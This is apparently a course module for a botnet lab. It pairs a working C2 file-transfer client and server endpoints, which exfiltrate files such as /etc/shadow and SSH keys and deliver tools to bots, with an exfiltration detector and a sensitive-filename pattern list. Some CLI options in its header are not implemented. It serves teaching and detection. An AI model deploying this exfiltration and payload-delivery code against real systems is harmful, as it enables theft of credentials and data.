"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: C2 File Transfer (Attack + Defense)
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching points:
  Bidirectional file transfer over C2 is essential for:
    - Exfiltrating captured data (logs, configs, credentials)
    - Deploying updated payloads / tools to bots
    - Staging lateral movement tooling
    - Exfiltrating /etc/passwd or /etc/shadow

  The resource (Advanced Botnet) implemented this as base64 blobs
  over the raw socket. This module adds it to the Angelware C2
  architecture (Flask /upload and /download endpoints), with
  both the transfer capability and its detection.

Attack side (FileTransferClient):
  Used by bot_agent to upload files to C2 and receive downloads.
  Implements chunked transfer with integrity verification (SHA-256).
  Supports: single files, compressed archives.

Defense side (FileTransferDetector — IDS Engine 19):
  Detects large or frequent outbound transfers that indicate
  exfiltration:
    - Large POST body to the C2 server IP
    - High-volume outbound TCP to a single destination
    - Repeated large transfers at regular intervals (scheduled exfil)
    - YARA-style pattern matching on transferred content
      (detects /etc/passwd, private keys, .env files)

MITRE:
  T1020  Automated Exfiltration
  T1041  Exfiltration Over C2 Channel
  T1560  Archive Collected Data
  T1105  Ingress Tool Transfer

CLI:
  python3 file_transfer.py --server              (run test server)
  python3 file_transfer.py --upload FILE         (test upload)
  python3 file_transfer.py --download REMOTE OUT (test download)
  python3 file_transfer.py --detect              (IDS demo)
  python3 file_transfer.py --demo                (full demo)
"""

import os
import sys
import time
import json
import math
import gzip
import base64
import hashlib
import threading
import tempfile
import shutil
from datetime import datetime
from collections import defaultdict, deque
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    from flask import Flask, request, jsonify, send_file
    import io
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

try:
    import psutil
    PSUTIL_OK = True
except ImportError:
    PSUTIL_OK = False


# ════════════════════════════════════════════════════════════════
#  SHARED UTILITIES
# ════════════════════════════════════════════════════════════════

CHUNK_SIZE = 64 * 1024  # 64 KB chunks

def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

def sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
            h.update(chunk)
    return h.hexdigest()

def compress(data: bytes) -> bytes:
    return gzip.compress(data, compresslevel=6)

def decompress(data: bytes) -> bytes:
    return gzip.decompress(data)

def encode_payload(data: bytes, compress_it: bool = True) -> dict:
    """Encode file data for wire transmission."""
    if compress_it:
        compressed = compress(data)
        ratio = len(compressed) / max(len(data), 1)
        use_compression = ratio < 0.95
    else:
        use_compression = False

    wire_bytes = compress(data) if use_compression else data
    return {
        "data":       base64.b64encode(wire_bytes).decode(),
        "compressed": use_compression,
        "sha256":     sha256_bytes(data),
        "size":       len(data),
    }

def decode_payload(payload: dict) -> bytes:
    """Decode wire payload back to original bytes."""
    raw = base64.b64decode(payload["data"])
    data = decompress(raw) if payload.get("compressed") else raw
    expected = payload.get("sha256")
    if expected and sha256_bytes(data) != expected:
        raise ValueError("SHA-256 integrity check failed — file corrupted or tampered")
    return data


# ════════════════════════════════════════════════════════════════
#  ATTACK SIDE: File Transfer Client (bot side)
# ════════════════════════════════════════════════════════════════

class FileTransferClient:
    """
    Bot-side file transfer client.
    Sends files to the C2 server and receives files from it.

    Used in two ways:
      1. Exfiltration: bot reads local file → uploads to C2
         (e.g. /etc/passwd, SSH keys, config files)
      2. Tool delivery: C2 sends payload → bot writes and executes
         (e.g. updated bot binary, lateral movement tools)
    """

    def __init__(self, c2_host: str = "192.168.100.10",
                 c2_port: int = 5000,
                 auth_token: str = "aw"):
        self.c2_host   = c2_host
        self.c2_port   = c2_port
        self.auth_token = auth_token
        self._base_url = f"http://{c2_host}:{c2_port}"

    def _post_json(self, path: str, body: dict) -> dict:
        import urllib.request, urllib.error
        url  = self._base_url + path
        data = json.dumps(body).encode()
        req  = urllib.request.Request(
            url, data=data,
            headers={
                "Content-Type": "application/json",
                "X-Auth-Token": self.auth_token,
            }
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"error": f"HTTP {e.code}: {e.read().decode()[:100]}"}
        except Exception as e:
            return {"error": str(e)}

    def upload_file(self, local_path: str,
                    remote_name: str = None) -> dict:
        """
        Read a local file and upload it to the C2 server.

        Real-world use: bot exfiltrates /etc/shadow, ~/.ssh/id_rsa,
        .env files, application configs.
        Research use: demonstrate exfiltration channel.

        Returns status dict with upload ID for retrieval.
        """
        path = Path(local_path)
        if not path.exists():
            return {"error": f"File not found: {local_path}"}

        remote_name = remote_name or path.name
        print(f"[FileXfer] Uploading {local_path} ({path.stat().st_size} bytes) "
              f"→ C2 as '{remote_name}'")

        with open(local_path, "rb") as f:
            data = f.read()

        payload = encode_payload(data)
        body = {
            "filename":   remote_name,
            "bot_id":     f"bot_{os.getpid()}",
            "source":     str(path.absolute()),
            "payload":    payload,
            "uploaded_at": datetime.now().isoformat(),
        }
        result = self._post_json("/upload", body)
        if "error" not in result:
            print(f"[FileXfer] Upload complete: {result}")
        else:
            print(f"[FileXfer] Upload failed: {result['error']}")
        return result

    def download_file(self, remote_name: str,
                      local_dest: str = None) -> dict:
        """
        Request a file from the C2 server and write it locally.

        Real-world use: C2 delivers updated malware binary,
        lateral movement tools, configuration updates.
        """
        import urllib.request, urllib.error
        local_dest = local_dest or f"/tmp/{remote_name}"
        url = (f"{self._base_url}/download?filename={remote_name}"
               f"&bot_id=bot_{os.getpid()}")
        req = urllib.request.Request(
            url,
            headers={"X-Auth-Token": self.auth_token}
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                raw = resp.read().decode()
                payload = json.loads(raw)
            data = decode_payload(payload)
            with open(local_dest, "wb") as f:
                f.write(data)
            print(f"[FileXfer] Downloaded '{remote_name}' → {local_dest} "
                  f"({len(data)} bytes, SHA-256 verified)")
            return {"status": "ok", "local_path": local_dest,
                    "size": len(data)}
        except Exception as e:
            return {"error": str(e)}

    def upload_archive(self, paths: list, archive_name: str = "exfil.tar.gz") -> dict:
        """
        Create a compressed archive of multiple files and upload it.
        Used for bulk exfiltration.
        MITRE: T1560 (Archive Collected Data)
        """
        import tarfile, io
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for p in paths:
                if os.path.exists(p):
                    tar.add(p, arcname=os.path.basename(p))
        buf.seek(0)
        archive_data = buf.read()

        # Write to temp file and upload
        tmp = f"/tmp/{archive_name}"
        with open(tmp, "wb") as f:
            f.write(archive_data)
        result = self.upload_file(tmp, archive_name)
        os.unlink(tmp)
        return result


# ════════════════════════════════════════════════════════════════
#  C2 SERVER EXTENSION: Flask endpoints for file transfer
#  Add these to c2_server.py
# ════════════════════════════════════════════════════════════════

FILE_STORE_DIR = "/tmp/c2_file_store"

def add_file_transfer_endpoints(app, auth_token: str = "aw"):
    """
    Register /upload and /download endpoints on the Flask C2 app.
    Call this from c2_server.py after app = Flask(__name__).

    Usage:
        from file_transfer import add_file_transfer_endpoints
        add_file_transfer_endpoints(app)
    """
    os.makedirs(FILE_STORE_DIR, exist_ok=True)
    upload_log: list = []
    upload_lock = threading.Lock()

    def _auth(req):
        return req.headers.get("X-Auth-Token") == auth_token

    @app.route("/upload", methods=["POST"])
    def file_upload():
        if not _auth(request):
            return jsonify({"error": "unauthorized"}), 403
        data = request.get_json()
        if not data or "payload" not in data:
            return jsonify({"error": "missing payload"}), 400

        filename = data.get("filename", "unknown")
        bot_id   = data.get("bot_id", "unknown")

        # Sanitize filename — prevent path traversal
        safe_name = Path(filename).name
        dest_path = os.path.join(FILE_STORE_DIR, f"{bot_id}_{safe_name}")

        try:
            file_data = decode_payload(data["payload"])
        except ValueError as e:
            return jsonify({"error": str(e)}), 400

        with open(dest_path, "wb") as f:
            f.write(file_data)

        entry = {
            "bot_id":      bot_id,
            "filename":    filename,
            "saved_as":    dest_path,
            "size":        len(file_data),
            "sha256":      sha256_bytes(file_data),
            "source":      data.get("source", "unknown"),
            "uploaded_at": datetime.now().isoformat(),
        }
        with upload_lock:
            upload_log.append(entry)

        print(f"[C2-FileXfer] UPLOAD from {bot_id}: "
              f"{filename} ({len(file_data)} bytes) → {dest_path}")
        return jsonify({"status": "received", "upload_id": len(upload_log),
                        "sha256": entry["sha256"]})

    @app.route("/download", methods=["GET"])
    def file_download():
        if not _auth(request):
            return jsonify({"error": "unauthorized"}), 403
        filename = request.args.get("filename")
        bot_id   = request.args.get("bot_id", "unknown")
        if not filename:
            return jsonify({"error": "missing filename"}), 400

        safe_name = Path(filename).name
        # Look in FILE_STORE_DIR for a file to send
        candidates = [
            os.path.join(FILE_STORE_DIR, safe_name),
            os.path.join(FILE_STORE_DIR, f"deploy_{safe_name}"),
        ]
        src = next((c for c in candidates if os.path.exists(c)), None)
        if not src:
            return jsonify({"error": f"file not found: {filename}"}), 404

        with open(src, "rb") as f:
            data = f.read()

        payload = encode_payload(data)
        print(f"[C2-FileXfer] DOWNLOAD to {bot_id}: "
              f"{filename} ({len(data)} bytes)")
        return jsonify(payload)

    @app.route("/uploads", methods=["GET"])
    def list_uploads():
        """View all uploaded files (operator dashboard)."""
        if not _auth(request):
            return jsonify({"error": "unauthorized"}), 403
        with upload_lock:
            return jsonify({"uploads": upload_log})

    return app


# ════════════════════════════════════════════════════════════════
#  DEFENSE SIDE: File Transfer Exfiltration Detector
#  IDS Engine 19
# ════════════════════════════════════════════════════════════════

def _default_alert(engine, severity, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n{'='*60}\n  ALERT [{severity}]  {engine}  @ {ts}\n  {msg}\n{'='*60}\n")

_alert_fn = _default_alert

def register_alert_fn(fn):
    global _alert_fn
    _alert_fn = fn


class ExfiltrationDetector:
    """
    IDS Engine 19 — Exfiltration / Ingress Transfer Detection.

    Monitors for:
      1. Large outbound POST body (> threshold) to a single
         destination in a short time window.
         Standard HTTP POST for form data is rarely > 100KB.
         File exfiltration can be 10MB+.

      2. Transfer volume accumulation — even small uploads add
         up. Multiple uploads totaling > threshold in 5 minutes
         from one source IP.

      3. Content-type mismatch — application/json body that is
         mostly base64 suggests binary file encoding.

      4. Ingress from non-C2 IP — download of files from IPs
         that are not the registered C2 server (unexpected source).

      5. Sensitive filename patterns — upload of files matching
         patterns like *.key, *.pem, .env, passwd, shadow, *.conf.

    MITRE: T1020, T1041, T1560, T1105
    """

    SENSITIVE_FILENAME_PATTERNS = [
        ".key", ".pem", ".p12", ".pfx",  # TLS/SSH private keys
        "id_rsa", "id_ed25519", "id_dsa", # SSH keys by name
        "passwd", "shadow", "sudoers",     # credential files
        ".env", "*.conf", "*.cfg",         # config files
        "*.db", "*.sqlite",                # databases
        "*.log",                           # logs (exfil for intel)
        "wp-config.php", "config.php",     # CMS credentials
        "secrets.json", "credentials.json",
    ]

    LARGE_UPLOAD_THRESHOLD_BYTES = 500_000  # 500 KB
    VOLUME_WINDOW_SEC             = 300      # 5 minutes
    VOLUME_THRESHOLD_BYTES        = 5_000_000  # 5 MB total in window

    def __init__(self):
        # Per-source-IP upload tracking
        self._volume: dict[str, deque] = defaultdict(
            lambda: deque()  # deque of (timestamp, size_bytes)
        )
        self._cooldown: dict[str, float] = {}
        self._lock = threading.Lock()

    def _cooldown_ok(self, key: str, secs: float = 120.0) -> bool:
        now = time.time()
        if now - self._cooldown.get(key, 0) >= secs:
            self._cooldown[key] = now
            return True
        return False

    def _volume_in_window(self, src_ip: str) -> int:
        now = time.time()
        q = self._volume[src_ip]
        while q and q[0][0] < now - self.VOLUME_WINDOW_SEC:
            q.popleft()
        return sum(sz for _, sz in q)

    def observe_upload(self, src_ip: str, filename: str,
                       size_bytes: int, content_type: str = ""):
        """
        Called when an upload request is detected.
        Feed from C2 /upload endpoint or DPI engine.
        """
        now = time.time()
        with self._lock:
            self._volume[src_ip].append((now, size_bytes))

        # Check 1: single large upload
        if size_bytes > self.LARGE_UPLOAD_THRESHOLD_BYTES:
            if self._cooldown_ok(f"large_{src_ip}"):
                _alert_fn(
                    "Exfiltration/LargeUpload", "HIGH",
                    f"LARGE FILE UPLOAD DETECTED: possible data exfiltration\n"
                    f"  Source IP: {src_ip}\n"
                    f"  Filename:  {filename}\n"
                    f"  Size:      {size_bytes / 1024:.1f} KB "
                    f"(threshold {self.LARGE_UPLOAD_THRESHOLD_BYTES // 1024} KB)\n"
                    f"  Normal bot heartbeats and small JSON payloads are <1KB.\n"
                    f"  MITRE: T1041 (Exfiltration Over C2 Channel)"
                )

        # Check 2: volume accumulation
        total = self._volume_in_window(src_ip)
        if total > self.VOLUME_THRESHOLD_BYTES:
            if self._cooldown_ok(f"volume_{src_ip}"):
                _alert_fn(
                    "Exfiltration/VolumeThreshold", "HIGH",
                    f"EXFILTRATION VOLUME THRESHOLD EXCEEDED\n"
                    f"  Source IP: {src_ip}\n"
                    f"  Total uploaded in {self.VOLUME_WINDOW_SEC}s: "
                    f"{total / 1024 / 1024:.1f} MB\n"
                    f"  Threshold: {self.VOLUME_THRESHOLD_BYTES // 1024 // 1024} MB\n"
                    f"  MITRE: T1020 (Automated Exfiltration)"
                )

        # Check 3: sensitive filename
        fname_lower = filename.lower()
        for pattern in self.SENSITIVE_FILENAME_PATTERNS:
            clean = pattern.lstrip("*")
            if fname_lower.endswith(clean) or \
                    os.path.basename(fname_lower) == clean.lstrip("."):
                if self._cooldown_ok(f"sensitive_{src_ip}_{filename}"):
                    _alert_fn(
                        "Exfiltration/SensitiveFile", "CRITICAL",
                        f"SENSITIVE FILE EXFILTRATION DETECTED\n"
                        f"  Source IP: {src_ip}\n"
                        f"  Filename:  {filename}\n"
                        f"  Matches sensitive pattern: {pattern}\n"
                        f"  Private keys, credential files, and configs "
                        f"indicate targeted data theft.\n"
                        f"  MITRE: T1560 (Archive Collected Data)"
                    )
                break

    def observe_download(self, dest_ip: str, filename: str,
                         size_bytes: int, c2_ip: str = None):
        """
        Called when a bot downloads a file.
        Large downloads from unexpected sources indicate
        ingress tool transfer.
        """
        if size_bytes < 10_000:  # < 10KB not interesting
            return

        if c2_ip and dest_ip != c2_ip:
            if self._cooldown_ok(f"ingresssrc_{dest_ip}"):
                _alert_fn(
                    "IngressTransfer/UnexpectedSource", "MED",
                    f"FILE DOWNLOADED FROM NON-C2 IP\n"
                    f"  Bot IP:      {dest_ip}\n"
                    f"  Source IP:   {c2_ip} (expected C2)\n"
                    f"  Filename:    {filename}\n"
                    f"  This may indicate lateral tool staging from a "
                    f"compromised internal host.\n"
                    f"  MITRE: T1105 (Ingress Tool Transfer)"
                )

    def run_demo(self):
        """Demonstrate exfiltration detection with simulated events."""
        print("[IDS-E19] Simulating file exfiltration events...")
        self.observe_upload("192.168.100.11", "database_backup.db",
                            2_500_000)
        self.observe_upload("192.168.100.11", "id_rsa", 3200)
        self.observe_upload("192.168.100.11", "config.json", 50_000)
        # Volume accumulation
        for i in range(5):
            self.observe_upload("192.168.100.12",
                                f"logs_{i}.tar.gz", 1_200_000)
        print("[IDS-E19] Demo complete.")


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="File Transfer Module — Attack + Defense")
    parser.add_argument("--detect", action="store_true",
                        help="Run exfiltration detector demo")
    parser.add_argument("--demo",   action="store_true",
                        help="Full attack+defense demo")
    parser.add_argument("--encode", metavar="FILE",
                        help="Encode a file and print stats")
    args = parser.parse_args()

    if args.encode:
        with open(args.encode, "rb") as f:
            data = f.read()
        payload = encode_payload(data)
        print(f"Original:    {len(data)} bytes")
        print(f"Compressed:  {payload['compressed']}")
        print(f"Encoded:     {len(payload['data'])} chars (base64)")
        print(f"SHA-256:     {payload['sha256']}")

    if args.detect or args.demo:
        det = ExfiltrationDetector()
        det.run_demo()
